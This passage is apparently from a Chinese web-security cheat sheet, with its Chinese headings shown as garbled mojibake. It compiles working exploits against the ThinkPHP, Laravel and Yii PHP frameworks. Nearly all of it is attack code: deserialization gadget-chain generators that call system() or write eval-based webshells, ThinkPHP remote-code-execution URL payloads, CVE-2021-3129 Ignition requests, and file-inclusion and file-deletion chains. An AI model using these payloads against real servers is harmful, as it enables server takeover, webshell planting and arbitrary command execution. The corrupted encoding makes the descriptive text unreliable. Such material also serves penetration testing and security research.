=&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;, &#x27;data_compress&#x27; =&gt; false, ]; $this-&gt;tag = &#x27;xxx&#x27;; &#125; &#125;&#125;namespace &#123; $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($window); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();&#125; 5.1.x é€šç”¨ æœªå¼€å¯å¼ºåˆ¶è·¯ç”±RCE ?s=index/\\think\\Request/input&amp;filter[]=system&amp;data=pwd ?s=index/\\think\\request/input?data[]=-1&amp;filter=phpinfo ?s=index/\\think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt; ?s=index/\\think\\view\\driver\\Think/display&amp;template=&lt;?php phpinfo();?&gt; ?s=index/\\think\\view\\driver\\Think/__call&amp;method=display&amp;params[]=&lt;?php system(&#39;whoami&#39;); ?&gt; ?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt; ?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id ?s=/index/\\think\\request/cache&amp;key=1|phpinfo ?s=/index/\\think\\request/cache&amp;key=ls|system ä»»æ„æ–‡ä»¶åˆ é™¤ å­˜åœ¨ä½ç½®ï¼š\\thinkphp\\library\\think\\process\\pipes\\Windows.php 12345678910&lt;?phpnamespace think\\process\\pipes;class Pipes &#123;&#125;class Windows extends Pipes &#123; private $files = []; public function __construct() &#123; $this-&gt;files = [&#x27;tmp.txt&#x27;]; &#125;&#125;echo base64_encode(serialize(new Windows())); - æ–‡ä»¶åŒ…å« Thinkphp å¤šè¯­è¨€åŠŸèƒ½å¯¼è‡´çš„ä»»æ„æ–‡ä»¶åŒ…å« `?lang=../../../../../public/index` http://tttang.com/archive/1865/ 5.1.31 RCE index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39; 5.1.38 ååºåˆ—åŒ– thinkPHP5.1æ•´ç† index.php?sss=whoami POST: data=xxxxxx 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;sss&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;sss&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // è¡¨å•ajaxä¼ªè£…å˜é‡ &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo urlencode(serialize(new Windows()));?&gt; 6.0.x é€šç”¨ ååºåˆ—åŒ– ThinkPHP V6.0.x ååºåˆ—åŒ–æ¼æ´ a. 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace think\\model\\concern;trait Attribute&#123; private $data; private $withAttr;&#125;trait ModelEvent&#123; protected $withEvent;&#125;namespace think;abstract class Model&#123; use model\\concern\\Attribute; use model\\concern\\ModelEvent; private $exists; private $force; private $lazySave; protected $suffix; function __construct($a = &#x27;&#x27;) &#123; $func = function()&#123;phpinfo();&#125;; $b=\\Opis\\Closure\\serialize($func); $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;suffix = $a; $this-&gt;data=[&#x27;x&#x27;=&gt;&#x27;&#x27;]; $c=unserialize($b); $this-&gt;withAttr=[&#x27;x&#x27;=&gt;$c]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;require &#x27;closure/autoload.php&#x27;;echo urlencode(serialize(new Pivot(new Pivot()))); b. 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace think\\model\\concern;trait Attribute&#123; private $data = [&quot;key&quot; =&gt; [&quot;key1&quot; =&gt; &quot;whoami&quot;]]; private $withAttr = [&quot;key&quot;=&gt;[&quot;key1&quot;=&gt;&quot;system&quot;]]; protected $json = [&quot;key&quot;];&#125;namespace think;abstract class Model&#123; use model\\concern\\Attribute; private $lazySave; protected $withEvent; private $exists; private $force; protected $table; protected $jsonAssoc; function __construct($obj = &#x27;&#x27;) &#123; $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;table = $obj; $this-&gt;jsonAssoc = true; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;$a = new Pivot();$b = new Pivot($a);echo urlencode(serialize($b)); æ–‡ä»¶åŒ…å« Thinkphp å¤šè¯­è¨€åŠŸèƒ½å¯¼è‡´çš„ä»»æ„æ–‡ä»¶åŒ…å«ï¼Œç‰ˆæœ¬è¦æ±‚ ThinkPHP v6.0.1 &lt;= v6.0.x &lt;= v6.0.13 ?lang=../../../../../public/index http://tttang.com/archive/1865/ å…¶ä»– tp6.0.8ååºåˆ—åŒ–æ¼æ´åˆ†æ a. 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace League\\Flysystem\\Cached\\Storage;abstract class AbstractCache &#123;&#125;namespace think\\cache;use think\\cache\\Driver;abstract class Driver &#123;&#125;namespace think\\cache\\driver;use think\\cache\\driver;class File extends Driver &#123; protected $options = []; public function __construct() &#123; $this-&gt;options = [ &#x27;expire&#x27; =&gt; 0, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;&#x27;, &#x27;hash_type&#x27; =&gt; &#x27;md5&#x27;, &#x27;data_compress&#x27; =&gt; false, &#x27;tag_prefix&#x27; =&gt; &#x27;tag:&#x27;, &#x27;serialize&#x27;=&gt; [&#x27;system&#x27;] ]; &#125;&#125;namespace think\\filesystem;use League\\Flysystem\\Cached\\Storage\\AbstractCache;class CacheStore extends AbstractCache &#123; protected $store; protected $key; protected $autosave; protected $complete; public function __construct($store) &#123; $this-&gt;autosave = false; $this-&gt;key = &quot;1&quot;; $this-&gt;complete = &#x27;`sleep 10`&#x27;; $this-&gt;store = $store; &#125;&#125;use think\\cache\\driver\\file;$a = new CacheStore(new File());echo serialize($a);echo &quot;&lt;/br&gt;&quot;;echo urlencode(serialize($a));?&gt; b. https://www.heibai.org/1604.htmlhttps://www.cnblogs.com/20175211lyz/p/13639789.htmlhttps://new.qq.com/omn/20200629/20200629A0RG1800.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace League\\Flysystem\\Cached\\Storage;abstract class AbstractCache &#123;&#125;namespace think\\cache;use think\\cache\\Driver;abstract class Driver &#123;&#125;namespace think\\cache\\driver;use think\\cache\\driver;class File extends Driver &#123; protected $options = []; public function __construct() &#123; $this-&gt;options = [ &#x27;expire&#x27; =&gt; 0, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;php://filter/write=convert.base64-decode/resource=./&#x27;, &#x27;hash_type&#x27; =&gt; &#x27;md5&#x27;, &#x27;data_compress&#x27; =&gt; false, &#x27;tag_prefix&#x27; =&gt; &#x27;tag:&#x27;, &#x27;serialize&#x27;=&gt; [&#x27;trim&#x27;] //ä½¿ç”¨trimå»æ‰[] ]; &#125;&#125;namespace think\\filesystem;use League\\Flysystem\\Cached\\Storage\\AbstractCache;class CacheStore extends AbstractCache &#123; protected $store; protected $key; protected $autosave; protected $complete; public function __construct($store) &#123; $this-&gt;autosave = false; $this-&gt;key = &quot;1&quot;; $this-&gt;complete = &#x27;uuuPDw/cGhwIHBocGluZm8oKTtldmFsKCRfR0VUWzFdKTs/PiA=&#x27;; $this-&gt;store = $store; &#125;&#125;use think\\cache\\driver\\file;$a = new CacheStore(new File());echo serialize($a);echo &quot;&lt;/br&gt;&quot;;echo urlencode(serialize($a));?&gt; c. https://yq1ng.github.io/z_post/ctfshow-thinkphp%E4%B8%93%E9%A2%98/ 12345678910111213141516171819202122232425262728/*** @Author ying* @Date 8/20/2021 5:01 PM* @Version 1.0*/namespace League\\Flysystem\\Cached\\Storage &#123; use League\\Flysystem\\Adapter\\Local; class Adapter &#123; protected $autosave = true; protected $expire = null; protected $adapter; protected $file; public function __construct() &#123; $this-&gt;autosave = false; $this-&gt;expire = &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;; $this-&gt;adapter = new Local(); $this-&gt;file = &#x27;yq1ng.php&#x27;; &#125; &#125;&#125;namespace League\\Flysystem\\Adapter &#123; class Local &#123; &#125;&#125;namespace &#123; use League\\Flysystem\\Cached\\Storage\\Adapter; echo urlencode(serialize(new Adapter()));&#125; â€‹ Laravel ç‰ˆæœ¬ vendor/laravel/framework/src/Illuminate/Foundation/Application.php 5.1 5.1.x ååºåˆ—åŒ–+RCE a. 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace&#123; use Mockery\\Generator\\DefinedTargetClass; class Swift_KeyCache_DiskKeyCache&#123; private $_keys=[&#x27;bit&#x27;=&gt;array(&#x27;bit&#x27;=&gt;&#x27;bit&#x27;)]; private $_path; public function __construct($cmd)&#123; $this-&gt;_path=new DefinedTargetClass($cmd); &#125; &#125; echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache($argv[1])));&#125;namespace Mockery\\Generator&#123; use Faker\\ValidGenerator; class DefinedTargetClass &#123; private $rfc; public function __construct($cmd) &#123; $this-&gt;rfc=new ValidGenerator($cmd); &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($cmd) &#123; $this-&gt;default = $cmd; &#125; &#125; class ValidGenerator &#123; protected $generator; protected $validator; protected $maxRetries; public function __construct($cmd)&#123; $this-&gt;generator=new DefaultGenerator($cmd); $this-&gt;maxRetries=9; $this-&gt;validator=&#x27;system&#x27;; &#125; &#125;&#125; b. 1234567891011121314151617181920212223242526272829303132333435&lt;?phpnamespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\Deprecated; class Swift_KeyCache_DiskKeyCache&#123; private $_keys=[&#x27;bit&#x27;=&gt;array(&#x27;bit&#x27;=&gt;&#x27;bit&#x27;)]; private $_path; public function __construct($cmd)&#123; $this-&gt;_path=new Deprecated($cmd); &#125; &#125; echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache($argv[1])));&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Illuminate\\Database\\DatabaseManager; abstract class BaseTag&#123; protected $description; &#125; final class Deprecated extends BaseTag&#123; public function __construct($cmd)&#123; $this-&gt;description=new DatabaseManager($cmd); &#125; &#125;&#125;namespace Illuminate\\Database&#123; class DatabaseManager&#123; protected $app; protected $extensions ; public function __construct($cmd) &#123; $this-&gt;app[&#x27;config&#x27;][&#x27;database.default&#x27;]=$cmd; $this-&gt;app[&#x27;config&#x27;][&#x27;database.connections&#x27;]=array($cmd=&gt;&#x27;system&#x27;); $this-&gt;extensions[$cmd]=&#x27;call_user_func&#x27;; &#125; &#125;&#125; c. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpnamespace&#123; use Prophecy\\Argument\\Token\\ObjectStateToken; class Swift_KeyCache_DiskKeyCache&#123; private $_keys=[&#x27;bit&#x27;=&gt;array(&#x27;bit&#x27;=&gt;&#x27;bit&#x27;)]; private $_path; public function __construct($cmd)&#123; $this-&gt;_path=new ObjectStateToken($cmd); &#125; &#125; echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache($argv[1])));&#125;namespace Prophecy\\Argument\\Token&#123; use Mockery\\Generator\\MockDefinition; use Illuminate\\Validation\\Validator; class ObjectStateToken&#123; private $name; private $value; private $util; public function __construct($cmd)&#123; $this-&gt;name=&#x27;bit&#x27;; $this-&gt;value=new MockDefinition($cmd); $this-&gt;util=new Validator(); &#125; &#125;&#125;namespace Illuminate\\Validation&#123; use Faker\\DefaultGenerator; class Validator&#123; protected $container; protected $extensions = []; public function __construct()&#123; $this-&gt;extensions[&#x27;y&#x27;]=&#x27;xxx@load&#x27;; $this-&gt;container=new DefaultGenerator(); &#125; &#125;&#125;namespace Faker&#123; use Mockery\\Loader\\EvalLoader; class DefaultGenerator &#123; protected $default; public function __construct() &#123; $this-&gt;default = new EvalLoader(); &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Mockery\\Generator&#123; use Illuminate\\Session\\Store; class MockDefinition&#123; protected $config; protected $code; public function __construct($cmd)&#123; $this-&gt;config=new Store(); $this-&gt;code=$cmd; &#125; &#125;&#125;namespace Illuminate\\Session&#123; class Store&#123; protected $name=&#x27;bit&#x27;;//ç±»ä¸å­˜åœ¨å°±è¡Œ &#125;&#125; 5.4.x 5.4.30 ååºåˆ—åŒ–ï¼ˆ5.4-5.8ï¼‰ Laravel5.4 ååºåˆ—åŒ–æ¼æ´æŒ–æ˜ a. Illuminate/Support/Manager.php::__call -&gt; driver() -&gt; Illuminate/Notifications/ChannelManager.php 123456789101112131415161718192021222324252627282930313233&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Notifications\\ChannelManager; class PendingBroadcast &#123; protected $events; public function __construct($cmd) &#123; $this-&gt;events = new ChannelManager($cmd); &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1])));&#125;namespace Illuminate\\Notifications&#123; class ChannelManager &#123; protected $app; protected $defaultChannel; protected $customCreators; public function __construct($cmd) &#123; $this-&gt;app = $cmd; $this-&gt;customCreators = [&#x27;x&#x27; =&gt; &#x27;system&#x27;]; $this-&gt;defaultChannel = &#x27;x&#x27;; &#125; &#125;&#125; b. Illuminate/Validation/Validator.php::__call 12345678910111213141516171819202122232425&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Validation\\Validator; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($cmd) &#123; $this-&gt;events = new Validator(); $this-&gt;event=$cmd; &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1])));&#125;namespace Illuminate\\Validation&#123; class Validator &#123; public $extensions = [&#x27;&#x27;=&gt;&#x27;system&#x27;]; &#125;&#125; c. Illuminate/Events/Dispatcher.php 12345678910111213141516171819202122232425262728&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Events\\Dispatcher; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($cmd) &#123; $this-&gt;events = new Dispatcher($cmd); $this-&gt;event=$cmd; &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1])));&#125;namespace Illuminate\\Events&#123; class Dispatcher &#123; protected $listeners; public function __construct($event)&#123; $this-&gt;listeners=[$event=&gt;[&#x27;system&#x27;]]; &#125; &#125;&#125; d. Illuminate/Bus/Dispatcher.php 12345678910111213141516171819202122232425262728293031&lt;?phpnamespace Illuminate\\Bus&#123;class Dispatcher&#123; protected $queueResolver; public function __construct()&#123; $this-&gt;queueResolver = &quot;system&quot;; &#125;&#125;&#125;namespace Illuminate\\Broadcasting&#123; use Illuminate\\Bus\\Dispatcher; class BroadcastEvent&#123; public $connection; public function __construct($cmd)&#123; $this-&gt;connection = $cmd; &#125; &#125; class PendingBroadcast&#123; protected $events; protected $event; public function __construct($event)&#123; $this-&gt;events = new Dispatcher(); $this-&gt;event = new BroadcastEvent($event); &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1]))); &#125;?&gt; e. Mockery/Loader/EvalLoader.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace Illuminate\\Bus&#123; use Mockery\\Loader\\EvalLoader; class Dispatcher&#123; protected $queueResolver; public function __construct()&#123; $this-&gt;queueResolver = [new EvalLoader(),&#x27;load&#x27;]; &#125;&#125;&#125;namespace Illuminate\\Broadcasting&#123; use Illuminate\\Bus\\Dispatcher; use Mockery\\Generator\\MockDefinition; class BroadcastEvent&#123; public $connection; public function __construct($code)&#123; $this-&gt;connection = new MockDefinition($code); &#125; &#125; class PendingBroadcast&#123; protected $events; protected $event; public function __construct($event)&#123; $this-&gt;events = new Dispatcher(); $this-&gt;event = new BroadcastEvent($event); &#125; &#125;echo base64_encode(serialize(new PendingBroadcast($argv[1]))); &#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Mockery\\Generator&#123; use Illuminate\\Session\\Store; class MockDefinition&#123; protected $config; protected $code; public function __construct($code)&#123; $this-&gt;config=new Store(); $this-&gt;code=$code; &#125; &#125;&#125;namespace Illuminate\\Session&#123; class Store&#123; protected $name=&#x27;x&#x27;;//ç±»ä¸å­˜åœ¨ &#125;&#125;?&gt; 5.7.x 5.7.29 ååºåˆ—åŒ–+RCE 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//ä¸ç”¨PendingCommand.php&lt;?phpnamespace Symfony\\Component\\Routing\\Loader\\Configurator &#123; class ImportConfigurator &#123; private $parent; public function __construct($parent) &#123; $this-&gt;parent = $parent; &#125; &#125;&#125;namespace Faker &#123; class DefaultGenerator&#123; protected $default; public function __construct($default) &#123; $this-&gt;default = $default; &#125; public function __call($method, $attributes) &#123; return $this-&gt;default; &#125; &#125; class ValidGenerator &#123; protected $generator; protected $validator; protected $maxRetries; public function __construct($validator,$generator) &#123; $this-&gt;generator = new DefaultGenerator($generator); $this-&gt;validator = $validator; $this-&gt;maxRetries = 1; &#125; public function __call($name, $arguments) &#123; $i = 0; do &#123; $res = call_user_func_array(array($this-&gt;generator, $name), $arguments); $i++; if ($i &gt; $this-&gt;maxRetries) &#123; throw new \\OverflowException(sprintf(&#x27;Maximum retries of %d reached without finding a valid value&#x27;, $this-&gt;maxRetries)); &#125; &#125; while (!call_user_func($this-&gt;validator, $res)); return $res; &#125; &#125;&#125;namespace &#123; $a = new Faker\\ValidGenerator(&quot;system&quot;,&quot;cat /flag&quot;); $b = new Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator($a); echo urlencode(serialize($b));&#125; 7.x 7.30 ååºåˆ—åŒ–+RCE a. 12345678910111213141516171819202122232425&lt;?phpnamespace Illuminate\\Routing&#123; use Illuminate\\Validation\\Validator; class PendingResourceRegistration &#123; protected $registrar; protected $registered = false; protected $name=&#x27;call_user_func&#x27;; protected $controller=&#x27;system&#x27;; protected $options; public function __construct($cmd)&#123; $this-&gt;registrar=new Validator(); $this-&gt;options=$cmd; &#125; &#125; echo urlencode(serialize(new PendingResourceRegistration($argv[1])));&#125;namespace Illuminate\\Validation&#123; class Validator&#123; public $extensions = []; public function __construct()&#123; $this-&gt;extensions[&#x27;&#x27;]=&#x27;call_user_func&#x27;; &#125; &#125;&#125; b. 12345678910111213141516171819202122232425262728293031323334&lt;?phpnamespace Illuminate\\Routing&#123; use Illuminate\\View\\InvokableComponentVariable; class PendingResourceRegistration &#123; protected $registrar; protected $registered = false; public function __construct()&#123; $this-&gt;registrar=new InvokableComponentVariable(); &#125; &#125; echo urlencode(serialize(new PendingResourceRegistration()));&#125;namespace Illuminate\\View&#123; use PHPUnit\\Framework\\MockObject\\MockClass; class InvokableComponentVariable&#123; protected $callable; public function __construct()&#123; $this-&gt;callable=array(new MockClass(),&#x27;generate&#x27;); &#125; &#125;&#125;namespace PHPUnit\\Framework\\MockObject&#123; class MockClass&#123; private $classCode; private $mockName; private $configurableMethods; public function __construct()&#123; $this-&gt;classCode=&#x27;eval($_POST[&quot;cmd&quot;]);&#x27;; $this-&gt;mockName=&#x27;bit&#x27;; $this-&gt;configurableMethods=&#x27;bit&#x27;; &#125; &#125;&#125; 8.x 8.26.1 RCE CVE-2021-3129 å½“Laravelå¼€å¯äº†Debugæ¨¡å¼æ—¶ï¼Œç”±äºLaravelè‡ªå¸¦çš„Ignition ç»„ä»¶å¯¹file_get_contents()å’Œfile_put_contents()å‡½æ•°çš„ä¸å®‰å…¨ä½¿ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘èµ·æ¶æ„è¯·æ±‚ï¼Œæ„é€ æ¶æ„Logæ–‡ä»¶ç­‰æ–¹å¼è§¦å‘Pharååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ 1234567891011POST /_ignition/execute-solution HTTP/1.1Host: 192.168.160.130:8077Content-Type: application/jsonContent-Length: 168&#123; &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;, &quot;parameters&quot;: &#123; &quot;variableName&quot;: &quot;username&quot;, &quot;viewFile&quot;: &quot;xxxxxxx&quot; &#125;&#125; é¡µé¢å‡ºç°äº†Ignitionçš„æŠ¥é”™ï¼Œè¯´æ˜æ¼æ´å­˜åœ¨ï¼Œä¸”å¼€å¯äº†debugæ¨¡å¼ã€‚ ä½¿ç”¨å¦‚ä¸‹æ•°æ®åŒ…æ¸…é™¤æ—¥å¿—æ–‡ä»¶ï¼š 1234567891011POST /_ignition/execute-solution HTTP/1.1Host: 192.168.160.130:8077Content-Type: application/jsonContent-Length: 328&#123; &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;, &quot;parameters&quot;: &#123; &quot;variableName&quot;: &quot;username&quot;, &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot; &#125;&#125; 9.x 9.1.8 ååºåˆ—åŒ–+RCE https://github.com/1nhann/vulns/issues a. 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace Illuminate\\Contracts\\Queue&#123; interface ShouldQueue &#123; &#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher&#123; protected $container; protected $pipeline; protected $pipes = []; protected $handlers = []; protected $queueResolver; function __construct() &#123; $this-&gt;queueResolver = &quot;system&quot;; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; use Illuminate\\Contracts\\Queue\\ShouldQueue; class BroadcastEvent implements ShouldQueue &#123; function __construct() &#123; &#125; &#125; class PendingBroadcast&#123; protected $events; protected $event; function __construct() &#123; $this-&gt;event = new BroadcastEvent(); $this-&gt;event-&gt;connection = &quot;whoami&quot;; $this-&gt;events = new \\Illuminate\\Bus\\Dispatcher(); &#125; &#125;&#125;namespace&#123; $a = new \\Illuminate\\Broadcasting\\PendingBroadcast(); echo base64_encode(serialize($a));&#125; b. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace Faker&#123; class Generator&#123; protected $providers = []; protected $formatters = []; function __construct() &#123; $this-&gt;formatter = &quot;register&quot;; $this-&gt;formatters = 9999; &#125; &#125;&#125;namespace Illuminate\\Routing&#123; class PendingResourceRegistration&#123; protected $registrar; protected $name; protected $controller; protected $options = []; protected $registered = false; function __construct() &#123; $this-&gt;registrar = new \\Faker\\Generator(); $this-&gt;name = &quot;d:/var/www/untitiled/public/1.php&quot;; $this-&gt;controller = &#x27;&lt;?php phpinfo();?&gt;&#x27;; $this-&gt;options = 8; &#125; &#125;&#125;namespace Symfony\\Component\\Mime\\Part&#123; abstract class AbstractPart &#123; private $headers = null; &#125; class SMimePart extends AbstractPart&#123; protected $_headers; public $inhann; function __construct()&#123; $this-&gt;_headers = [&quot;register&quot;=&gt;&quot;file_put_contents&quot;]; $this-&gt;inhann = new \\Illuminate\\Routing\\PendingResourceRegistration(); &#125; &#125;&#125;namespace&#123; $a = new \\Symfony\\Component\\Mime\\Part\\SMimePart(); $ser = preg_replace(&quot;/([^\\&#123;]*\\&#123;)(.*)(s:49.*)(\\&#125;)/&quot;,&quot;\\\\1\\\\3\\\\2\\\\4&quot;,serialize($a)); echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));&#125; c. 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpnamespace GuzzleHttp\\Cookie&#123; class SetCookie &#123; private static $defaults = [ &#x27;Name&#x27; =&gt; null, &#x27;Value&#x27; =&gt; null, &#x27;Domain&#x27; =&gt; null, &#x27;Path&#x27; =&gt; &#x27;/&#x27;, &#x27;Max-Age&#x27; =&gt; null, &#x27;Expires&#x27; =&gt; null, &#x27;Secure&#x27; =&gt; false, &#x27;Discard&#x27; =&gt; false, &#x27;HttpOnly&#x27; =&gt; false ]; function __construct() &#123; $this-&gt;data[&#x27;Expires&#x27;] = &#x27;&lt;?php phpinfo();?&gt;&#x27;; $this-&gt;data[&#x27;Discard&#x27;] = 0; &#125; &#125; class CookieJar&#123; private $cookies = []; private $strictMode; function __construct() &#123; $this-&gt;cookies[] = new SetCookie(); &#125; &#125; class FileCookieJar extends CookieJar&#123; private $filename; private $storeSessionCookies; function __construct() &#123; parent::__construct(); $this-&gt;filename = &quot;d:/var/www/untitled/public/shell.php&quot;; $this-&gt;storeSessionCookies = true; &#125; &#125;&#125;namespace&#123; $a = new \\GuzzleHttp\\Cookie\\FileCookieJar(); echo base64_encode(serialize($a));&#125; d. 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace Faker&#123; class Generator&#123; protected $providers = []; protected $formatters = []; function __construct() &#123; $this-&gt;formatter = &quot;dispatch&quot;; $this-&gt;formatters = 9999; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; public function __construct() &#123; $this-&gt;event = &quot;calc.exe&quot;; $this-&gt;events = new \\Faker\\Generator(); &#125; &#125;&#125;namespace Symfony\\Component\\Mime\\Part&#123; abstract class AbstractPart &#123; private $headers = null; &#125; class SMimePart extends AbstractPart&#123; protected $_headers; public $inhann; function __construct()&#123; $this-&gt;_headers = [&quot;dispatch&quot;=&gt;&quot;system&quot;]; $this-&gt;inhann = new \\Illuminate\\Broadcasting\\PendingBroadcast(); &#125; &#125;&#125;namespace&#123; $a = new \\Symfony\\Component\\Mime\\Part\\SMimePart(); $ser = preg_replace(&quot;/([^\\&#123;]*\\&#123;)(.*)(s:49.*)(\\&#125;)/&quot;,&quot;\\\\1\\\\3\\\\2\\\\4&quot;,serialize($a)); echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));&#125; â€‹ Yii ç‰ˆæœ¬ a. åœ¨controllersç›®å½•æ–°å»ºTestController.phpæ§åˆ¶å™¨ï¼Œæ‰“å¼€TestController.phpæ–‡ä»¶è¾“å…¥&lt;?php echo Yii::getVersion(); ?&gt;ï¼Œè®¿é—®Yiié¡¹ç›®ä¸­çš„testæ§åˆ¶å™¨ä¸‹çš„indexï¼šindex.php?r=test b. /vendor/yiisoft/yii2/BaseYii.php 2.0.x &lt;2.0.37 ååºåˆ—åŒ– a. yii\\db\\BatchQueryResult::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() b. yii\\db\\BatchQueryResult::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\CreateAction::run() c. 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace yii\\rest&#123; class IndexAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;assert&#x27;; $this-&gt;id = &#x27;file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[0]);?&gt;&quot;);exit();&#x27;; &#125; &#125;&#125;namespace yii\\db&#123; use yii\\web\\DbSession; class BatchQueryResult &#123; private $_dataReader; public function __construct()&#123; $this-&gt;_dataReader=new DbSession(); &#125; &#125;&#125;namespace yii\\web&#123; use yii\\rest\\IndexAction; class DbSession &#123; public $writeCallback; public function __construct()&#123; $a=new IndexAction(); $this-&gt;writeCallback=[$a,&#x27;run&#x27;]; &#125; &#125;&#125;namespace&#123; use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult()));&#125; 2.0.38 ååºåˆ—åŒ– a. Codeception\\Extension\\RunProcess::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() b. Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()-&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() 2.0.42 ååºåˆ—åŒ– yii 2.0.42 æœ€æ–°ååºåˆ—åŒ–åˆ©ç”¨å…¨é›† a. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpnamespace Codeception\\Extension&#123; use Prophecy\\Prophecy\\ObjectProphecy; class RunProcess&#123; private $processes = []; public function __construct()&#123; $a = new 